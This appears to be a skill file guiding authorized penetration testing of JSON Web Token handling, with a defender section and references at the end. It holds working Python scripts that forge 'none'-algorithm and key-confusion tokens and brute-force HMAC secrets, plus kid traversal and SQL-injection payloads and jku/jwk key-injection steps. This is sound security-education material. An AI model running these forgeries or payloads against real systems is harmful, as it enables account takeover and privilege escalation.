---
name: jwt-attacks
description: Use when testing JSON Web Token handling on an authorized
  engagement. Covers decoding and structure analysis, algorithm confusion
  (none algorithm, RS256 to HS256 key confusion), weak HMAC secret brute
  forcing, kid and jku/x5u header injection, claim tampering (sub, role,
  exp), and jwk injection. Use when logins return JWTs, APIs accept
  bearer tokens, or session cookies contain base64 JSON blobs that look
  like signed tokens.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [auth-attacks, api-security-testing, webapp-pentest-methodology]
tools:
  - name: Python
    version: 3.12
  - name: Burp Suite
    version: 2026.2
---

JSON Web Tokens carry identity claims (who you are, what role you have)
protected by a signature the server should verify. When verification is
weak, attackers forge tokens and become anyone. This skill covers the
full authorized methodology: reading tokens, attacking the algorithm,
brute forcing secrets, injecting keys, and tampering claims. All testing
targets systems you have written permission to test.

## Quick Workflow

1. Capture a real token at login and decode its header, payload, and
   signature.
2. Note the algorithm (`alg`), key id (`kid`), and every claim
   (`sub`, `role`, `exp`, `aud`, `iss`).
3. Test the `none` algorithm and algorithm confusion (RS256 to HS256).
4. Brute force weak HMAC secrets with a wordlist.
5. Test `kid` for path traversal and SQL injection, and `jku`/`x5u`
   for key URL redirection.
6. Tamper claims: change `sub` to another user, escalate `role`,
   extend or drop `exp`.
7. Replay forged tokens against protected endpoints and confirm the
   server honors them.
8. Record the forged token, the endpoint, and the privilege gained.

## 1. Decoding and structure analysis

A JWT is three base64url parts: `header.payload.signature`.

```bash
# Decode a token quickly with Python (stdlib only)
python3 - <<'EOF'
import base64, json, sys
tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SIGNATURE"
def dec(p):
    return json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
h, p, s = tok.split(".")
print("header:", json.dumps(dec(h), indent=2))
print("payload:", json.dumps(dec(p), indent=2))
print("signature present:", bool(s))
EOF
```

```bash
# Grab the token the app actually issues and decode it
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","password":"Testpass1!"}' | python3 -c "
import base64, json, sys
tok = json.load(sys.stdin)['token']
h, p, s = tok.split('.')
d = lambda x: json.loads(base64.urlsafe_b64decode(x + '=' * (-len(x) % 4)))
print('alg:', d(h).get('alg'), '| kid:', d(h).get('kid'), '| jku:', d(h).get('jku'))
print('claims:', d(p))"
```

Checklist from the decode: symmetric (`HS256/384/512`) versus
asymmetric (`RS256/384/512`, `ES256`) algorithm, presence of `kid`,
`jku`, `x5u`, `x5c`, and whether security claims (`exp`, `aud`, `iss`)
exist at all.

## 2. The none algorithm

Some servers accept `alg: none` and skip verification entirely.

```bash
# Forge a none-alg token with Python and test it
python3 - <<'EOF'
import base64, json, urllib.request

def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()

# take the real payload, escalate the role, sign with nothing
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "username": "admin", "role": "admin"}
forged = b64(header) + "." + b64(payload) + "."

req = urllib.request.Request("https://target.example/api/admin/users",
    headers={"Authorization": "Bearer " + forged})
try:
    print(urllib.request.urlopen(req, timeout=10).getcode())
except Exception as e:
    print("rejected:", e)
EOF
```

Variants to try: `"alg": "None"`, `"alg": "none"` with a non-empty
signature, and stripping the signature segment entirely (two parts
instead of three). If any is accepted, you have full account control.

## 3. RS256 to HS256 key confusion

When the server verifies RS256 with a library call that also accepts
HS256, you can sign with the RSA *public* key used as an HMAC secret.

```bash
# Step 1: get the server's RSA public key. Common spots:
# https://target.example/.well-known/jwks.json
# https://target.example/api/public-key.pem
curl -s 'https://target.example/.well-known/jwks.json' | head -c 600
```

```bash
# Step 2: forge in Python: header says HS256, HMAC-signed with the
# public key bytes as the secret (cryptography-free HMAC via hashlib)
python3 - <<'EOF'
import base64, json, hmac, hashlib, urllib.request

# paste the PEM public key (strip headers) as the HMAC secret
PUBLIC_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

def b64d(o): return base64.urlsafe_b64encode(o).rstrip(b"=").decode()
def b64e(o): return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "1", "username": "admin", "role": "admin"}
signing = (b64e(header) + "." + b64e(payload)).encode()
sig = b64d(hmac.new(PUBLIC_PEM, signing, hashlib.sha256).digest())
forged = signing.decode() + "." + sig
print(forged)
EOF
```

This only works if the server's JWT library is misconfigured to accept
both algorithms with one code path. Test it; when it lands, it is
critical.

## 4. Weak HMAC secret brute force

HS256 with `secret`, `password123`, or the app name as the key is
still common. Crack it offline, then forge freely.

```bash
# jwt-cracker style loop in pure Python against a wordlist
python3 - <<'EOF'
import base64, json, hmac, hashlib

tok = "PASTE_REAL_TOKEN_HERE"
h_b64, p_b64, s_b64 = tok.split(".")
signing = (h_b64 + "." + p_b64).encode()
target = base64.urlsafe_b64decode(s_b64 + "=" * (-len(s_b64) % 4))
alg = json.loads(base64.urlsafe_b64decode(h_b64 + "=" * (-len(h_b64) % 4)))["alg"]
digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]

with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
    for line in f:
        secret = line.rstrip("\n").encode()
        if hmac.new(secret, signing, digest).digest() == target:
            print("FOUND SECRET:", line.rstrip("\n"))
            break
EOF
```

```bash
# Also try the obvious candidates first: empty string, "secret",
# the app name, and the JWT's own claims
for s in "" secret password changeme target; do
  echo "trying: [$s]"
done
```

With the secret, forge any claim set you want using the same signing
code as section 3 but with the cracked secret.

## 5. kid, jku, and x5u injection

The `kid` header tells the server which key to use. If it is used
unsafely, it becomes an injection point.

```bash
# kid path traversal: does the server load the key from disk?
# Try kid values and watch for verification behavior changes:
#   ../../etc/passwd
#   ../../dev/null  (empty key: some stacks then accept any signature)
# Test by forging a token signed with HMAC of empty string and kid
# pointing at /dev/null.
```

```bash
# kid SQL injection: if kids come from a database, try
#   ' OR '1'='1
# and time-based variants, watching for login bypasses or errors.
```

`jku` (JWK Set URL) and `x5u` (X.509 URL) let the token name its own
key source:

```bash
# 1. Host a JWKS file on your server containing YOUR RSA key:
#    {"keys":[{"kty":"RSA","kid":"evil","n":"...","e":"AQAB"}]}
# 2. Forge a token with header {"alg":"RS256","jku":"https://your-server/jwks.json","kid":"evil"}
# 3. Sign it with YOUR private key.
# If the server fetches your JWKS and trusts it, you mint admin tokens.
```

This is also SSRF (the server fetches your URL), so the ssrf skill's
filter bypasses apply if the server restricts the key URL.

## 6. Claim tampering

Even with valid signatures, logic bugs in claim handling break
authorization.

```bash
# Take a valid low-privilege token and test each claim change by
# re-signing (with cracked secret) or by none-alg/confusion:
# - "sub": "1"            -> another user's id (IDOR via token)
# - "role": "user"        -> "admin"
# - "username": "bob"     -> "admin"
# - drop "exp" entirely   -> token never expires?
# - "exp": 9999999999     -> far-future expiry accepted?
# - "aud": "other-app"    -> audience not checked?
```

```bash
# Quick test harness: modify one claim at a time and hit a protected
# endpoint, logging which mutation the server accepts
python3 - <<'EOF'
import base64, json, urllib.request
# fill in: REAL_TOKEN, SECRET (or use none-alg from section 2)
EOF
```

Also test claim type confusion: `"admin": "true"` (string) versus
`"admin": true` (boolean), and array versus string roles. Parsers that
are loose about types often grant access on the wrong type.

## 7. JWK injection (embedded keys)

If the header contains a `jwk` with the public key inline, the server
might trust the token's own key.

```bash
# Forge a token whose header embeds YOUR public key as "jwk",
# sign with your private key. If accepted, the signature check is
# meaningless because the attacker supplies the key.
```

## Edge cases

- The token lives in an HttpOnly cookie, not a header: all the same
  attacks apply, just send the forged token as the cookie value.
- The server verifies the signature but ignores `exp`: session tokens
  never expire, so one leaked token is a permanent backdoor; note it.
- Multiple tokens (access plus refresh): the refresh flow is a second
  attack surface; test it with the same techniques.
- The app uses encrypted JWTs (JWE, `alg: dir`): you cannot read or
  forge without the key; test for padding oracle or key confusion only
  if the engagement covers crypto, otherwise note the opacity.
- `at_hash` / `c_hash` mismatches: informational, but sloppy OIDC
  implementations sometimes skip them, hinting at loose validation
  elsewhere.
- Clock skew: `nbf`/`iat` in the future may still be accepted; useful
  for pre-playing tokens but rarely decisive.

## Escalation

- Secret brute force fails on rockyou: build a targeted list from the
  app (company name, product name, "jwt", "secret", years) before
  giving up; short targeted lists beat huge generic ones.
- Key confusion fails: check whether the server publishes multiple
  keys (JWKS rotation); try each public key as the HMAC secret.
- `jku` restricted to the app's domain: look for an open redirect or
  a file upload on that domain to host your JWKS (redirect chains
  sometimes pass naive allow-list checks).
- Signature solid but claims sloppy: pivot to claim tampering and
  type confusion, which need no crypto break at all.
- Everything verifies correctly: the token may still leak (logged in
  URLs, stored in localStorage readable by XSS); chain with web-xss
  rather than forcing the crypto.

## Detection and defender view

Defenders see JWT attacks as tokens with `alg: none`, unexpected
`kid` values containing paths or SQL, `jku`/`x5u` pointing at external
domains, and sudden role or subject changes for a known user. Logs
showing one account's token suddenly carrying another account's `sub`
are a clear signal. The durable fixes are an explicit allow-list of
permitted algorithms (never accept `none`, never mix symmetric and
asymmetric verification in one code path), strong random HMAC secrets
(256 bits from a CSPRNG), strict `kid` handling (map IDs to keys
server side, never build file paths or SQL from them), validating
`exp`, `aud`, and `iss` on every request, and pinning `jku`/`x5u` to
trusted HTTPS URLs. Rotate keys and keep token lifetimes short.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): token
  endpoint abuse.
- MITRE ATT&CK T1539 (Steal Web Session Cookie): token theft.
- MITRE ATT&CK T1550.001 (Use Alternate Authentication Material:
  Application Access Token): forged token use.
- CWE-347 (Improper Verification of Cryptographic Signature).
- CWE-327 (Use of a Broken or Risky Cryptographic Algorithm): none
  algorithm.
- CWE-798 (Use of Hard-coded Credentials): weak JWT secrets.
- CWE-639 (Authorization Bypass Through User-Controlled Key): sub
  tampering.
- OWASP JWT Cheat Sheet.
- RFC 7515 (JWS), RFC 7519 (JWT).
- PortSwigger Web Security Academy: JWT labs and cheat sheet.
